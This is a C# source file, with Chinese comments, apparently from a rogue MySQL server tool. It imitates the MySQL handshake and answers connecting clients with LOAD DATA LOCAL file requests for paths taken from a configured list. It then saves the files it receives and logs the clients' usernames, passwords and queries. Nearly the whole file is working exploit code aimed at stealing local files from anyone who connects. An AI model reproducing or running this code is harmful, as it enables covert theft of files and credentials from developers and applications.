using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using MysqlT.App;
using Mysql.MysqlData;
using System.Text;
using Mysql.MysqlPlugin;

namespace Mysql
{
    public class Mysql
    {
        private static Socket server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
        private static IPEndPoint point;
        private static Config config = Config.GetConfig();
        private static List<Thread> clientthread = new List<Thread>();
        /// <summary>
        /// 打开Mysql服务端
        /// </summary>
        /// <param name="ip"></param>
        /// <param name="port"></param>
        public static void open()
        {
            try
            {
                point = new IPEndPoint(IPAddress.Parse(config.Host), config.Port);
                server.Bind(point);
                server.Listen(20);
                MysqlT.App.Command.Write("Mysql服务端已经成功启动","Ok",ConsoleColor.Red);
                Thread servar_thread = new Thread(Listen);
                clientthread.Add(servar_thread);
                servar_thread.Start();

            }
            catch (Exception)
            {
                MysqlT.App.Command.Write("Mysql服务端启动失败,请检查端口是否已经被占用!","Error",ConsoleColor.Red);
                throw;
            }


        }
        public static void Stop()
        {
            
            server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            foreach (var item in clientthread)
            {
                Thread thread = new Thread(()=>{ item.Abort(); });
                thread.Start();
            }
            clientthread = new List<Thread>();

        }
        private static void Listen()
        {

            while (true)
            {
                try
                {
                    UserInfo userInfo = new UserInfo();
                    userInfo.client = server.Accept();
                    userInfo.host = userInfo.client.RemoteEndPoint.ToString().Split(':')[0];
                    Thread thread = new Thread(Received);
                    clientthread.Add(thread);
                    if (!config.ClientInfo.ContainsKey(userInfo.host))
                    {
                        config.ClientInfo.Add(userInfo.host, new MysqlClient(userInfo.host));
                        log.Write(userInfo.host + "已经连接");
                    }
                    else
                    {
                        log.Write(userInfo.host + "重复链接  连接次数：" + Convert.ToString(config.ClientInfo[userInfo.host].ClientNumber));
                        config.ClientInfo[userInfo.host].Sate = 0;
                    }
                    config.ClientInfo[userInfo.host].ClientNumber++;
                    thread.Start(userInfo);
                    userInfo.client.Send(MysqlGainData.GetHello(config.Version, 152, userInfo.Salt));
                }
                catch (Exception)
                {
                    MysqlT.App.Command.Write("Mysql 已退出","Eooro",ConsoleColor.Red);
                    
                }


                //client.Last().Send(MysqlGainData.GetLoginError((short)1045, "Fuck"));
                //client.Last().Send(MysqlGainData.GetHello("5.5.54-log",152, "2y,kZaWpMpnWIHliHlgA"));
            }

        }
        private static void Received(object l)
        {
            UserInfo userInfo = (UserInfo)l;
            string host = userInfo.host;
            byte[] data = new byte[1024 * 1024 * 3];
            /*try
            {*/


            while (true)
            {
                try
                {
                int len = userInfo.client.Receive(data);
                if (len == 0)
                {
                    break;
                }
                byte[] d = new byte[len];
                Array.Copy(data, 0, d, 0, len);
                if (ccc(d, host, userInfo)) { continue; }
                switch (userInfo.LoginSate)
                {
                    case 0:
                        if (!userInfo.LoadData)
                        {
                            userInfo.client.Send(MysqlGainData.GetLoginError((short)1045, string.Format("Access denied for user '{0}'@'{1}' (using password: YES)", userInfo.username, userInfo.password)));         //不支持读文件关闭连接
                            userInfo.client.Close();
                            log.Write(host + ":目标不支持Load Data");
                            //client.RemoveAt(ClientId);
                            return;
                        }
                        else
                        {
                            if (config.ClientInfo[userInfo.host].FileNumber < config.File.Count())
                            {
                                if (Login(userInfo))
                                {
                                    userInfo.client.Send(MysqlGainData.GetLoginOk());         //发送登陆成功
                                    userInfo.LoginSate = 1;            //状态改为已登录

                                }
                                else
                                {
                                    userInfo.client.Send(MysqlGainData.GetLoginError((short)1045, string.Format("Access denied for user '{0}'@'{1}' (using password: YES)", userInfo.host, userInfo.username)));
                                }

                            }
                            else
                            {
                                userInfo.client.Send(MysqlGainData.GetLoginError((short)1045, string.Format("Access denied for user '{0}'@'{1}' (using password: YES)", userInfo.host, userInfo.username)));         //发送登陆失败
                                userInfo.LoginSate = 0;            //状态改为未登录
                                MysqlT.App.Command.Write(host + ":没有文件可以发送","Error",ConsoleColor.Red);
                                return;

                            }

                        };
                        break;
                    case 1:
                        if (config.ClientInfo[userInfo.host].FileNumber < config.File.Count())
                        {
                            if (MysqlGainData.GetFile(config.File[config.ClientInfo[userInfo.host].FileNumber]).Length < 3)
                            {
                                userInfo.client.Send(MysqlGainData.GetQueryError((short)1054, "(using password)"));
                                MysqlT.App.Command.Write(host + ":没有文件可以发送","No",ConsoleColor.Red);
                                return;
                                
                            }
                            else if (d.Length == 7)
                            {
                                userInfo.client.Send(MysqlGainData.GetQueryOk());
                                continue;
                            }
                            else if (d.Length == 5 && d[d.Length - 1] == 0x01)
                            {
                                MysqlT.App.Command.Write(host + ":退出了","Error",ConsoleColor.Red);
                                return;
                            }
                            else
                            {
                                userInfo.lastFile = config.ClientInfo[userInfo.host].FileNumber;
                                userInfo.client.Send(MysqlGainData.GetFile(config.File[userInfo.lastFile]));
                                config.ClientInfo[userInfo.host].FileNumber++;
                                userInfo.FileSate = true;
                                    MysqlT.App.Command.Write(host+"已经发送文件路径,等待回调,发送次数" + config.ClientInfo[userInfo.host].FileNumber,"Ok",ConsoleColor.Yellow);

                            }

                        }
                        else
                        {
                            userInfo.client.Send(MysqlGainData.GetLoginError((short)1045, "You Passwo"));
                                MysqlT.App.Command.Write(host + ":没有文件可以发送","Error",ConsoleColor.Red);
                            return;
                        }
                        break;
                    default:
                        break;
                }
                // client[size].Send(MysqlGainData.two);

                 }
                 catch(Exception e) {
                     userInfo.FileSate = false;
                     userInfo.IsFileDataS = false;
                     userInfo.FileSate = false;
                     MysqlT.App.Command.Write(host+"断开了链接   错误信息"+e.Message,"Error",ConsoleColor.Red);                    
                     return;
                 }
            }

        }
        public static bool Login(UserInfo userInfo) {
            if (!config.LoginCheck)
            {
                return true;
            }
            foreach (var item in config.MysqlUser)
            {
                if (item.Key == userInfo.username)
                {
                    if (MySqlNativePasswordPlugin.GetPassword(item.Value, userInfo.Salt) == userInfo.password)
                    {
                        userInfo.Qpassword = item.Value;
                        return true;
                    }

                }
            }
            return false;
        }

        public static bool ccc(byte[] data, string host, UserInfo userInfo)
        {
            bool retrun;
            byte[] t_data = { };
            //    userInfo.FileDataS = userInfo.FileDataS == null ? new List<byte>() : userInfo.FileDataS;
            if (userInfo.LoginSate == 0)
            {
                MysqlGainData.TransformationLoginData(data, userInfo);
                MysqlT.App.Command.Write(Function.change(userInfo),"Info",ConsoleColor.DarkMagenta);
                retrun = false;
            }
            else if (MysqlGainData.IsFileData(ref data) && userInfo.FileSate && !userInfo.IsFileDataS)
            {
                log.BkFileWirte(ref data, userInfo);
                MysqlGainData.TransformationFileData(ref data);
                log.FileWirte(ref data, userInfo);
                MysqlT.App.Command.Write(string.Format("来自{0} 发送的文件已经收到并保存 长度{1}   路径{2}", host, data.Length, config.File[config.ClientInfo[userInfo.host].FileNumber - 1]),"Ok",ConsoleColor.DarkMagenta);
                userInfo.client.Send(MysqlGainData.GetQueryError((short)1045, "you have one error"));
                retrun = true;
                userInfo.FileSate = false;
            }
            else if (userInfo.FileSate)
            {
                if (MysqlGainData.IsFileData(ref data)&&data.Length!=1024*1024*3)
                {
                    userInfo.FileDataS.AddRange(data);
                    log.BkFileWirte(ref userInfo);
                    MysqlT.App.Command.Write(string.Format("来自{0} 发送的超大文件已经收到并正在转换 长度{1}   路径{2}", host, userInfo.FileDataS.Count, config.File[config.ClientInfo[userInfo.host].FileNumber - 1]),"Ok", ConsoleColor.DarkMagenta);
                    MysqlGainData.TransformationFileData(ref userInfo.FileDataS);
                    log.FileWirte(userInfo);
                    MysqlT.App.Command.Write(string.Format("来自{0} 发送的超大文件已经收到并保存 长度{1}   路径{2}", host, userInfo.FileDataS.Count, config.File[config.ClientInfo[userInfo.host].FileNumber - 1]),"Ok", ConsoleColor.DarkMagenta);
                    //client[ClientId].Send(MysqlGainData.GetQueryError((short)1045, "you have one error"));
                    userInfo.client.Send(MysqlGainData.GetQueryError((short)1045, "you have one error"));
                    userInfo.IsFileDataS = false;
                    userInfo.FileSate = false;
                    retrun = true;
                    userInfo.FileDataS = new List<byte>();
                    GC.Collect();

                }
                else
                {
                    userInfo.FileDataS.AddRange(data);
                    userInfo.IsFileDataS = true;
                    retrun = true;
                }

            }
            else if (data.Length > 7)
            {
                t_data = MysqlGainData.TransformationData(data);
                retrun = false;

            }
            else
            {
                retrun = false;
            }
            if (t_data.Length > 1) { MysqlT.App.Command.Write(host+":\t"+Encoding.Default.GetString(t_data),"Quer",ConsoleColor.Yellow); }
            data = null;
            t_data = null;
            return retrun;

        }
    }
}
